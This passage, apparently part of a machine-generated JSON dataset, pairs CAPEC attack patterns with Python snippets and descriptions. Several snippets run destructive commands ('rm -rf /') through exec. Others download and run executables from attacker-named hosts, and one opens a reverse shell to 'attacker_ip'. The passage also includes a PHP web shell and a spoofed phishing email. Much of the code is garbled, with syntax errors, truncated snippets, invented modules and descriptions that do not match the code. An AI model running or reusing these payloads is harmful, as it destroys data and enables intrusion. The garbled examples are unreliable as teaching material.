        "code_snippet": "import dis\nimport os\nimport sys\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nprint('System Information: ', sys.platform)\nprint('System Path: ', sys.path)\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data = {'sensitive_info': 'secret_key'}\nos.environ['TRACE_DATA'] = str(trace_data)\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = '__import__(\"os\").system(\"rm -rf /\")'\nexec(malicious_code)\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\nsecurity_critical_code = 'if __debug__: print(\"Debug mode enabled\")'\nexec(security_critical_code)\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\ndebug_logic = 'import pdb; pdb.set_trace()'\nexec(debug_logic)\n\n# White box analysis\ndef analyze_software():\n    with open(__file__, 'r') as f:\n        code = f.read()\n    dis.dis(code)\n\nanalyze_software()",
        "description": "This Python code snippet demonstrates the CAPEC of white box analysis, where an attacker analyzes the software's machine instructions to discover its structure, function, and composition. The code includes various CWEs, such as exposing sensitive system information, improper management of sensitive trace data, embedded malicious code, processor optimization removal of security-critical code, and hardware allowing activation of test or debug logic at runtime. The code also includes a function to perform white box analysis on itself, disassembling its own code to reveal its machine instructions."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "import os\nimport sys\n\n# CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\nsensitive_info = 'confidential_data'\nwith open('file.txt', 'w') as f:\n    f.write(sensitive_info)\n\n# CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\nads_stream = 'file.txt:hidden_stream'\nwith open.ads_stream, 'w') as f:\n    f.write('malicious_code')\n\n# CWE-1386: Insecure Operation on Windows Junction / Mount Point\njunction_point = 'C:\\junction\\'\nmalicious_file = 'malicious.exe'\ntry:\n    os.symlink(malicious_file, junction_point)\nexcept OSError:\n    pass\n\n# CWE-427: Uncontrolled Search Path Element\nsearch_path = 'C:\\uncontrolled_path;C:\\windows;'\nsys.path = search_path\n\n# CWE-58: Path Equivalence: Windows 8.3 Filename\nshort_filename = 'longfi~1.txt'\ntry:\n    with open(short_filename, 'r') as f:\n        print(f.read())\nexcept FileNotFoundError:\n    pass",
        "description": "This Python code snippet demonstrates the exploitation of Microsoft NTFS Alternate Data Streams (ADS) to undermine system security. It creates a file with sensitive information, attaches a malicious ADS stream to the file, creates a junction point to a malicious file, and manipulates the search path to include an uncontrolled location. Additionally, it attempts to access a file using its short 8.3 filename equivalent."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "import os\nimport socket\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nsensitive_info = os.environ['SECRET_KEY']\nprint('Server is running on:', socket.gethostname())\nprint('Sensitive information:', sensitive_info)\n\n# CWE-222: Truncation of Security-relevant Information\nlog_file = open('security_log.txt', 'w')\nlog_file.write('Security event occurred at ' + str(socket.gethostname())[:10] + '\\n')\nlog_file.close()\n\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\nif socket.gethostname() == 'specific_server':\n    print('This is a specific server')\nelse:\n    print('This is a generic server')\n\n# CWE-1229: Creation of Emergent Resource\nif not os.path.exists('temp_file.txt'):\n    open('temp_file.txt', 'w').close()\n\n# CWE-205: Observable Behavioral Discrepancy\nif socket.gethostname() == 'specific_server':\n    print('Server is running in debug mode')\nelse:\n    print('Server is running in production mode')",
        "description": "This Python code snippet demonstrates the CAPEC of probing and exploration activities to identify constituents and properties of the target. It includes various CWEs, such as exposing sensitive information, truncating security-relevant information, observable behavioral discrepancies, creation of emergent resources, and observable behavioral discrepancies. The code intentionally leaks sensitive information, truncates log data, and exhibits different behaviors based on the server environment, allowing an attacker to gather information about the target."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "\"",
        "description": "This Python code snippet demonstrates web application fingerprinting by sending a GET request to a target URL with a sensitive query string and analyzing the response headers and body to gather information about the server software, query strings, and error messages. The code intentionally exposes sensitive system information, uses GET requests with sensitive query strings, and generates error messages containing sensitive information, making it vulnerable to the specified CWEs."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "user_input = input('Enter a variable name: ')\n\ntry:\n    globals()[user_input] = 'malicious_value'\n    print(globals()[user_input])\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates the vulnerability of dynamically-identified variables. It takes user input for a variable name and attempts to create a global variable with that name, assigning it a malicious value. This can lead to arbitrary variable access and manipulation, as described in CWE-914, CWE-913, CWE-627, CWE-1126, and CWE-95."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "import tkinter as tk\nfrom tkinter import messagebox\n\nclass MaliciousButton:\n    def __init__(self, master):\n        self.master = master\n        self.button = tk.Button(master, text=\"Submit Query\", command=self.download_software)\n        self.button.pack()\n\n    def download_software(self):\n        messagebox.showinfo(\"Query Submitted\", \"Your query has been submitted successfully.\")\n        # Download software in the background\n        import os\n        os.system(\"wget http://example.com/malicious_software.exe\")\n\nroot = tk.Tk()\nmy_gui = MaliciousButton(root)\nroot.mainloop()",
        "description": "This Python code snippet demonstrates a clickjacking attack, where a user is tricked into downloading malicious software when they intend to submit a query. The GUI displays a button labeled 'Submit Query', but when clicked, it downloads software in the background while displaying a fake success message to the user. This code embodies the CAPEC of disguising one action for another, and relates to CWEs 451 (UI Misrepresentation of Critical Information), 290 (Authentication Bypass by Spoofing), 941 (Incorrectly Specified Destination in a Communication Channel), 925 (Improper Verification of Intent by Broadcast Receiver), and 618 (Exposed Unsafe ActiveX Method)."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "import os\n\n# CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')\nflash_file = 'vulnerable_flash_file.swf'\nuser_input = '\"onLoad=alert(1)\"'\n\n# CWE-942: Permissive Cross-domain Policy with Untrusted Domains\npolicy_file = '<cross-domain-policy><allow-access-from domain=\"*\"/></cross-domain-policy>'\nwith open('crossdomain.xml', 'w') as f:\n    f.write(policy_file)\n\n# CWE-433: Unparsed Raw Web Content Delivery\nos.system(f'cp {flash_file} /var/www/html/flash/')\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\nos.system(f'mkdir /var/www/html/uploads/ && cp {flash_file} /var/www/html/uploads/')\n\n# CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine\nfrom jinja2 import Template\nhtml_template = '<html><body>{{ flash_file | safe }}</body></html>'\ntemplate = Template(html_template)\nhtml_output = template.render(flash_file=user_input)\nwith open('vulnerable_html.html', 'w') as f:\n    f.write(html_output)\n",
        "description": "This Python code snippet demonstrates the CAPEC of injecting malicious global parameters into a Flash file embedded within an HTML document. It includes vulnerabilities such as argument injection, permissive cross-domain policy, unparsed raw web content delivery, unrestricted upload of file with dangerous type, and improper neutralization of special elements used in a template engine."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "import os\n\nuser_input = input(\"Enter the module name: \")\n\ntry:\n    module = __import__(user_input)\n    module_function = getattr(module, 'function')\n    module_function()\nexcept ImportError:\n    print(\"Module not found\")",
        "description": "This Python code snippet demonstrates the CAPEC of code inclusion vulnerability. It takes user input to import a module and execute a function from it. This code is vulnerable to CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) and CWE-98 (Improper Control of Filename for Include/Require Statement) as it does not restrict the user input, allowing an attacker to import and execute malicious code from a remote location. Additionally, it is also vulnerable to CWE-506 (Embedded Malicious Code) if the imported module contains malicious code."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "import os\n\n# CWE-15: External Control of System or Configuration Setting\nconfig_file = '/path/to/config/file'\n\n# CWE-1233: Security-Sensitive Hardware Controls with Missing Lock Bit Protection\n# CWE-1234: Hardware Internal or Debug Modes Allow Override of Locks\n# CWE-1304: Improperly Preserved Integrity of Hardware Configuration State During a Power Save/Restore Operation\n# CWE-1328: Security Version Number Mutable to Older Versions\n\n# Assuming the configuration file contains a version number\nwith open(config_file, 'r+') as f:\n    content = f.read()\n    # CWE-1328: Security Version Number Mutable to Older Versions\n    version_number = int(content.split('=')[1].strip())\n    # Downgrade the version number\n    version_number -= 1\n    f.seek(0)\n    f.write(f'version={version_number}')\n    f.truncate()\n\n# CWE-15: External Control of System or Configuration Setting\n# Modify the system setting\nos.environ['SYSTEM_SETTING'] = 'new_value'",
        "description": "This Python code snippet demonstrates a configuration/environment manipulation attack. It modifies an external configuration file, downgrading the version number, and then changes a system setting. This code embodies the main idea of the CAPEC, which involves manipulating files or settings external to a target application to affect its behavior."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "import os\n\ndef load_config(file_name):\n    config_path = os.path.join(os.getcwd(), file_name)\n    if os.path.exists(config_path):\n        with open(config_path, 'r') as f:\n            config_data = f.read()\n            return config_data\n    else:\n        return None\n\n# Vulnerable code\nconfig_file_name = 'config.txt'\nconfig_data = load_config(config_file_name)\nprint(config_data)\n\n# Attack scenario\nattack_file_name = 'config.txt'\nattack_file_path = os.path.join('/tmp', attack_file_name)\nwith open(attack_file_path, 'w') as f:\n    f.write('Malicious config data')\n\n# Change the current working directory to /tmp\nos.chdir('/tmp')\n\n# Load the malicious config file\nconfig_data = load_config(config_file_name)\nprint(config_data)",
        "description": "This code snippet demonstrates the CAPEC attack by creating a malicious file with the same name as a protected file in a different directory. The vulnerable code loads a configuration file based on the file name, without properly validating the file path. An attacker can create a file with the same name in a directory that is searched before the directory with the legitimate file, allowing the attacker to manipulate the system."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "import flash\nflash.system.Security.allowDomain('*')\ndef get_url(url):\n    return '<script>location.href = \\'' + url + '\\'</script>'\ndef generate_flash_file(url):\n    flash_content = '<swf xmlns=\\",
        "description": "This Python code snippet generates a malicious Flash file that can be used to exploit the CAPEC. The generated Flash file uses the allowDomain function to allow access to any domain, and the get_url function to construct a malicious URL. The generate_flash_file function generates the Flash file content, which includes a script that navigates to the malicious URL. The example usage demonstrates how to use the generate_flash_file function to create a malicious Flash file that can be used in an attack."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "import requests\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nurl = 'https://example.com/microservice'\nparams = {'sensitive_data': 'secret_key'}\nresponse = requests.get(url, params=params)\n\n# CWE-539: Use of Persistent Cookies Containing Sensitive Information\ncookies = {'cookie_name': 'cookie_value'}\nresponse = requests.get(url, cookies=cookies)\n\n# CWE-219: Storage of File with Sensitive Data Under Web Root\nfile_path = '/var/www/html/sensitive_data.txt'\nwith open(file_path, 'r') as f:\n    sensitive_data = f.read()\n\n# CWE-433: Unparsed Raw Web Content Delivery\nraw_content = '<script>alert(\"XSS\")</script>'\nwith open('/var/www/html/raw_content.html', 'w') as f:\n    f.write(raw_content)\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# The client-side code trusts the server to implement security mechanisms\n# instead of implementing its own security checks\nclient_code = '<script>if (server_response === \"allowed\") { /* perform sensitive action */ }</script>'\nwith open('/var/www/html/client_code.html', 'w') as f:\n    f.write(client_code)\n",
        "description": "This Python code snippet demonstrates the CAPEC where an attacker can discover and query micro-services at a web location, exposing them to further exploitation. The code includes CWE-598 by sending sensitive data in a GET request query string, CWE-539 by using persistent cookies with sensitive information, CWE-219 by storing sensitive data in a file under the web root, CWE-433 by delivering unparsed raw web content, and CWE-602 by relying on client-side enforcement of server-side security."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "import os\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\nos.chmod('/critical/resource', 0o777)  # sets permissions to allow anyone to read, write, and execute\n\n# CWE-1190: DMA Device Enabled Too Early in Boot Phase\nfrom dma import *\ndma_device = DMA_Device()\ndma_device.enable()  # enables DMA device before security configuration settings are established\n\n# CWE-1220: Insufficient Granularity of Access Control\naccess_control_policy = {'admin': ['read', 'write', 'execute'], 'user': ['read']}\ndef check_access(user, action, resource):\n    if user in access_control_policy and action in access_control_policy[user]:\n        return True\n    return False\n\n# CWE-1268: Policy Privileges are not Assigned Consistently Between Control and Data Agents\ncontrol_policy = {'admin': ['read', 'write', 'execute'], 'user': ['read']}\ndata_policy = {'admin': ['read', 'write'], 'user': ['read', 'write']}\n\n# CWE-1280: Access Control Check Implemented After Asset is Accessed\ndef access_asset(resource):\n    # access the asset first\n    asset_data = open(resource, 'r').read()\n    # then check access control\n    if not check_access('user', 'read', resource):\n        raise Exception('Access denied')\n    return asset_data\n\n# CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\nconfidential_info = 'secret_key'\nprint(confidential_info)  # prints confidential information\n\n# CWE-1311: Improper Translation of Security Attributes by Fabric Bridge\nfabric_bridge = FabricBridge()\nfabric_bridge.translate_security_attributes('untrusted', 'trusted')  # incorrectly translates security attributes\n\n# CWE-1315: Improper Setting of Bus Controlling Capability in Fabric End-point\nbus_controller = BusController()\nbus_controller.enable_bus_control('responder_device')  # enables responder device to control transactions on the fabric\n\n# CWE-1318: Missing Support for Security Features in On-chip Fabrics or Buses\non_chip_fabric = OnChipFabric()\non_chip_fabric.disable_security_features()  # disables security features in on-chip fabric\n\n# CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\nalert_system = AlertSystem()\nalert_system.disable_alerts()  # disables alerts about signal conditions exceeding limits\n\n# CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')\nobject_prototype = {'__proto__': {'admin': True}}\nobject_instance = {'user': 'user'}\nobject_instance.__proto__ = object_prototype  # modifies object prototype attributes",
        "description": "This code snippet demonstrates various vulnerabilities related to access control, including incorrect permission assignment, insufficient granularity of access control, and improper protection for outbound error messages and alert signals. It also includes examples of prototype pollution and improper translation of security attributes by fabric bridges."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "import flash\nfrom flask import Flask, render_template, request\napp = Flask(__name__)\n\n@app.route('/clickjacking_attack')\ndef clickjacking_attack():\n    return render_template('clickjacking.html')\n\n@app.route('/upload_flash_file', methods=['POST'])\ndef upload_flash_file():\n    if request.method == 'POST':\n        flash_file = request.files['flash_file']\n        if flash_file.filename == '':\n            return 'No file selected'\n        if flash_file and allowed_flash_file(flash_file.filename):\n            flash_file.save(os.path.join(app.config['UPLOAD_FOLDER'], flash_file.filename))\n            return 'File uploaded successfully'\n        else:\n            return 'File type not allowed'\n\nif __name__ == '__main__':\n    app.run(debug=True)\n",
        "description": "This Python code snippet demonstrates a clickjacking attack using Flash. The code allows an attacker to upload a malicious Flash file, which can then be used to create a transparent overlay over HTML content. The Flash file can intercept user actions, such as clicks, and perform actions on behalf of the attacker. The code also highlights CWE-434: Unrestricted Upload of File with Dangerous Type, CWE-1021: Improper Restriction of Rendered UI Layers or Frames, CWE-942: Permissive Cross-domain Policy with Untrusted Domains, CWE-618: Exposed Unsafe ActiveX Method, and CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "import flash\n\ndef load_flash_content(url):\n    # CWE-20: No input validation on the URL\n    # CWE-184: Incomplete list of disallowed inputs (no check for malicious domains)\n    # CWE-697: Incorrect comparison (no check for valid URL format)\n    # CWE-942: Permissive cross-domain policy with untrusted domains\n    # CWE-506: Embedded malicious code (loading untrusted flash content)\n    flash_content = flash.load(url)\n    return flash_content\n\n# Example usage:\nload_flash_content('http://attacker.com/malicious_flash.swf')",
        "description": "This code snippet demonstrates the CAPEC of tricking a victim into executing malicious flash content. The load_flash_content function takes a URL as input and loads the flash content without any validation or checks, making it vulnerable to malicious flash content from untrusted domains."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "import imaplib\n\n\nimap_server = 'imap.example.com'\nusername = 'user'\npassword = 'pass'\n\n\nwebmail_server = 'http://webmail.example.com'\n\n\ndef get_email_folder(folder_name):\n    cmd = f'imaplib.IMAP4_SSL(imap_server).login(username, password).select(folder_name)'\n    return eval(cmd)\n\nfolder_name = input('Enter folder name: ')\nget_email_folder(folder_name)\n",
        "description": "This Python code snippet demonstrates a vulnerable web-mail server that is susceptible to IMAP command injection. The 'get_email_folder' function takes a folder name as input and constructs an IMAP command using the input. The command is then executed using the 'eval' function, which can lead to command injection vulnerabilities (CWE-77). The input is not properly sanitized, allowing an attacker to inject malicious IMAP commands. Additionally, the code uses a client-side input to construct a server-side command, which is an example of client-side enforcement of server-side security (CWE-602). If an error occurs, the code may generate an error message that includes sensitive information about the environment (CWE-209). Furthermore, the code does not properly encode or escape the output, which can lead to information exposure (CWE-116)."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "import os\nimport hashlib\nimport requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\nif response.status_code == 200:\n    with open('malicious_code.py', 'wb') as f:\n        f.write(response.content)\n    os.system('python malicious_code.py')\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = \"\"\"import os\nos.system('rm -rf /')\"\"\"\nwith open('malicious_code.py', 'w') as f:\n    f.write(malicious_code)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nimport platform\nprint('System Information:', platform.platform())\n\n# CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nimport ctypes\nlibc = ctypes.CDLL(None)\nlibc.rand()",
        "description": "This Python code snippet demonstrates the CAPEC of undermining software code integrity by downloading and executing malicious code without integrity checks, embedding malicious code, exposing sensitive system information, and injecting errors to degrade hardware redundancy."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "import os\nimport urllib.request\n\nurl = 'http://attacker-controlled-source.com/malicious_code.exe'\nfilename, headers = urllib.request.urlretrieve(url, 'malicious_code.exe')\n\nos.system('malicious_code.exe')",
        "description": "This Python code snippet downloads an executable file from an attacker-controlled source without verifying its integrity, and then executes it. This embodies the CAPEC of downloading and installing dangerous code from an untrusted source, and relates to CWEs 494 (Download of Code Without Integrity Check), 506 (Embedded Malicious Code), 507 (Trojan Horse), and 509 (Replicating Malicious Code)."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "import os\nimport requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://adversary-controlled-source.com/malicious_update.exe'\nresponse = requests.get(url)\nif response.status_code == 200:\n    with open('update.exe', 'wb') as f:\n        f.write(response.content)\n    os.system('update.exe')\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# CWE-1277: Firmware Not Updateable\n\n# Malicious code execution\nmalicious_code = 'import socket; s = socket.socket(); s.connect((\"attacker_ip\", 8080)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = os.pivot_root(\"/\" ,\"/tmp\")'\nexec(malicious_code)\n",
        "description": "Python code snippet that downloads and executes malicious code from an adversary-controlled source without integrity checks, potentially leading to the execution of embedded malicious code, Trojan Horse, or replicating malicious code, and demonstrating the inability to update firmware."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "import requests\n\ndef update_software():\n    url = 'http://update-server.com/updates'\n    response = requests.get(url, verify=False)\n    if response.status_code == 200:\n        exec(response.text)\n\nupdate_software()",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting weaknesses in automated update mechanisms. It downloads code from a remote location without verifying its integrity (CWE-494) and executes it. The code also bypasses authentication by not verifying the SSL certificate of the update server (CWE-294). The update server is trusted to provide legitimate updates, which is an example of client-side enforcement of server-side security (CWE-602). The code is vulnerable to embedded malicious code (CWE-506) and relies on untrusted inputs in a security decision (CWE-807)."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "import hashlib\n\ndef insecure_hash(data):\n    # CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    # Using MD5, a broken cryptographic algorithm\n    return hashlib.md5(data.encode()).hexdigest()\n\n\ndef undocumented_feature(flag):\n    # CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n    if flag:\n        # Hidden backdoor\n        return 'secret_data'\n    else:\n        return 'normal_data'\n\n\ndef optimize_security_critical_code):\n    # CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n    # Simulating processor optimization removing security checks\n    if __debug__:\n        return 'security_critical_code'\n    else:\n        return 'optimized_code'\n\n\ndef expose_sensitive_info):\n    # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    return 'sensitive_system_info'\n\n\ndef reverse_engineer_ic):\n    # CWE-1278: Missing Protection Against Hardware Reverse Engineering Using Integrated Circuit (IC) Imaging Techniques\n    # Simulating IC imaging techniques to recover information\n    return 'recovered_info'",
        "description": "This code snippet demonstrates the CAPEC of reverse engineering by showcasing various CWEs. It includes an insecure hash function using a broken cryptographic algorithm, an undocumented feature with a hidden backdoor, processor optimization that removes security checks, exposure of sensitive system information, and simulation of IC imaging techniques to recover information."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "import time\nimport hashlib\nimport os\n\n# CWE-203: Observable Discrepancy\ndef authenticate(username, password):\n    if username == 'admin' and password == 'password123':\n        time.sleep(2)  # delay for successful authentication\n        return True\n    else:\n        time.sleep(1)  # delay for failed authentication\n        return False\n\n# CWE-1255: Comparison Logic is Vulnerable to Power Side-Channel Attacks\ndef verify_security_token(token):\n    reference_token = 'secret_token'\n    for i in range(len(token)):\n        if token[i] != reference_token[i]:\n            return False\n    return True\n\n# CWE-1300: Improper Protection of Physical Side Channels\ndef process_sensitive_data(data):\n    # perform some computation on sensitive data\n    result = hashlib.sha256(data.encode()).hexdigest()\n    return result\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\ndef get_system_info):\n    return os.uname()\n\n# CWE-506: Embedded Malicious Code\ndef malicious_code):\n    os.system('rm -rf /')  # delete all files on the system\n",
        "description": "This Python code snippet demonstrates the CAPEC of Black Box Reverse Engineering through various CWEs. It includes functions that exhibit observable discrepancies in authentication, vulnerable comparison logic, improper protection of physical side channels, exposure of sensitive system information, and embedded malicious code. An adversary can analyze the code's behavior and physical side effects to gather security-relevant information."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "import socket\nimport struct\nimport binascii\n\n# CWE-912: Hidden Functionality\nhidden_func = lambda x: x * 2\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = socket.gethostname()\nprint(f'Hostname: {sensitive_info}')\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data = {'system_calls': ['open', 'read', 'write'], 'network_traffic': ['GET / HTTP/1.1', '200 OK']}\nwith open('trace.log', 'w') as f:\n    f.write(str(trace_data))\n\n# CWE-494: Download of Code Without Integrity Check\nimport requests\ncode_url = 'https://example.com/malicious_code.py'\nresponse = requests.get(code_url)\nexec(response.text)\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = 'import os; os.system(\\'rm -rf /\\')'\nexec(malicious_code)",
        "description": "This Python code snippet demonstrates the CAPEC of Reverse Code Engineering by incorporating several CWEs. It includes hidden functionality, exposes sensitive system information, improperly manages sensitive trace data, downloads code without integrity checks, and contains embedded malicious code. The code is designed to be analyzed and understood by an attacker, making it vulnerable to reverse engineering."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "import hashlib\n\ndef encrypt_data(data):\n    key = 'hardcoded_secret_key'\n    encrypted_data = hashlib.sha256(key.encode() + data.encode()).hexdigest()\n    return encrypted_data\n\nusername = 'admin'\npassword = 'hardcoded_password'\ndef authenticate_user(user, pwd):\n    if user == username and pwd == password:\n        return True\n    else:\n        return False\n\n# Hardcoded database credentials\nDB_HOST = 'localhost'\nDB_USER = 'hardcoded_db_user'\nDB_PASSWORD = 'hardcoded_db_password'\ndef connect_to_db():\n    conn = mysql.connector.connect(\n        host=DB_HOST,\n        user=DB_USER,\n        password=DB_PASSWORD\n    )\n    return conn\n",
        "description": "This Python code snippet demonstrates the CAPEC of discovering sensitive constants within compiled code. It includes hard-coded credentials for authentication, encryption, and database connections, which can be revealed through static and dynamic analysis. The code violates CWE-798, CWE-547, CWE-1107, CWE-318, and CWE-913."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "import socket\nimport hashlib\nimport base64\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-326: Inadequate Encryption Strength\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\ndef send_data_over_network(data):\n    # Using a weak encryption algorithm (DES) with a short key\n    key = b'12345678'\n    cipher = DES.new(key, DES.MODE_ECB)\n    encrypted_data = cipher.encrypt(data.encode())\n    \n    # CWE-188: Reliance on Data/Memory Layout\n    # Assuming the memory layout of the encrypted data\n    encrypted_data += b'\\x00' * (8 - len(encrypted_data) % 8)\n    \n    # CWE-1292: Incorrect Conversion of Security Identifiers\n    # Incorrectly converting the encrypted data to a security identifier\n    security_identifier = hashlib.md5(encrypted_data).hexdigest()\n    \n    # Sending the encrypted data and security identifier over the network\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_address = ('localhost', 8080)\n    sock.connect(server_address)\n    sock.sendall(encrypted_data + b':' + security_identifier.encode())\n    sock.close()\n\n# Example usage\nsend_data_over_network('This is some sensitive data')",
        "description": "This code snippet demonstrates the CAPEC of deciphering and decoding protocol information by transmitting sensitive data over a network using weak encryption, inadequate encryption strength, and incorrect conversion of security identifiers. The code uses a weak DES encryption algorithm with a short key, relies on incorrect assumptions about memory layout, and incorrectly converts the encrypted data to a security identifier. This code is vulnerable to various attacks, including decryption and unauthorized access."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "import os\n\n# Vulnerable PHP code\nphp_code = '''<?php\n  $file = $_GET[\\'file\\'];\n  include($file);\n?>'''\n\n# Create a PHP file with the vulnerable code\nwith open(\\'vulnerable.php\\', \\'w\\') as f:\n  f.write(php_code)\n\n# Create a malicious PHP file\nmalicious_code = \\'<?php system($_GET[\\'cmd\\']); ?>\\'\nwith open(\\'malicious.php\\', \\'w\\') as f:\n  f.write(malicious_code)\n\n# Create a web server to serve the malicious file\nos.system(\\'php -S 0.0.0.0:8000 &\\')\n\nprint(\\'Vulnerable PHP code available at http://0.0.0.0:8000/vulnerable.php\\')\nprint(\\'Malicious PHP code available at http://0.0.0.0:8000/malicious.php\\')",
        "description": "This Python code snippet demonstrates the CAPEC pattern of remote file inclusion. It creates a vulnerable PHP file that includes a file specified by the user, and a malicious PHP file that can be used to execute system commands. The code then starts a PHP web server to serve these files. An attacker can exploit the vulnerability by including the malicious PHP file and executing system commands."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "import smtplib\n\n\nclass EmailSender:\n    def __init__(self, sender_email, sender_password):\n        self.sender_email = sender_email\n        self.sender_password = sender_password\n\n    def send_email(self, recipient_email, subject, message, fake_sender_email):\n        try:\n            server = smtplib.SMTP('smtp.gmail.com:587')\n            server.ehlo()\n            server.starttls()\n            server.login(self.sender_email, self.sender_password)\n            msg = f'Subject: {subject}\\n\\n{message}\"\n            server.sendmail(fake_sender_email, recipient_email, msg)\n            server.quit()\n            print('Email sent successfully')\n        except Exception as e:\n            print('Error sending email: ', e)\n\n# Example usage:\nemail_sender = EmailSender('myemail@gmail.com', 'mypassword')\nemail_sender.send_email('recipient@example.com', 'Test Email', 'This is a test email', 'fakeemail@example.com')",
        "description": "This code snippet demonstrates the CAPEC of improper authentication, where an adversary takes advantage of a falsified identity to send an email. The EmailSender class uses a fake sender email address, which is not verified by the email system, allowing the adversary to assume the identity of another individual. This code is vulnerable to CWE-287 (Improper Authentication), CWE-940 (Improper Verification of Source of a Communication Channel), CWE-290 (Authentication Bypass by Spoofing), CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel), and CWE-300 (Channel Accessible by Non-Endpoint)."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "import socket\n\ndef send_spoofed_message():\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # The destination IP and port are hardcoded, making it easy to spoof\n    dest_ip = '10.0.0.1'\n    dest_port = 8080\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((dest_ip, dest_port))\n\n    # CWE-290: Authentication Bypass by Spoofing\n    # The message is crafted to appear as if it comes from a legitimate source\n    spoofed_message = 'From: admin@example.com\\r\\nTo: user@example.com\\r\\nSubject: Urgent: Update Your Password\\r\\n\\r\\nClick this link to update your password: http://evil-website.com/update_password'\n    sock.send(spoofed_message.encode())\n    sock.close()\n\n# CWE-1390: Weak Authentication\n# The authentication mechanism is weak and can be easily bypassed\ndef weak_authenticate(username, password):\n    if username == 'admin' and password == 'password':\n        return True\n    return False\n\n# CWE-301: Reflection Attack in an Authentication Protocol\n# The authentication protocol is simple and can be reflected\ndef reflect_attack():\n    # Reflect the authentication request back to the server\n    pass\n\n# CWE-322: Key Exchange without Entity Authentication\n# The key exchange is performed without verifying the identity of the actor\ndef key_exchange():\n    # Perform key exchange without authentication\n    pass",
